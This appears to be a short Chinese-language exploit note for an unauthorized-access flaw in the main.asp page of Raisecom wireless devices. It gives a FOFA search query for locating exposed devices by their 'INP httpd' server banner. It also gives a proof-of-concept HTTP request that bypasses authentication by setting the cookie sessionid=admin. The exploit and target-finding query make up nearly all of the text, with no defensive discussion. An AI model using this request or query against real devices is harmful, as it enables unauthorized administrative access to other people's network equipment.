# 瑞斯康达main.asp未授权访问漏洞

瑞斯康达 wireless main.asp 存在未授权访问漏洞。

## fofa

```javascript
banner="Server: INP httpd" || header="Server: INP httpd"
```

## poc

```javascript
GET /main.asp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Ge  cko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cookie: sessionid=admin
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410290944091.webp)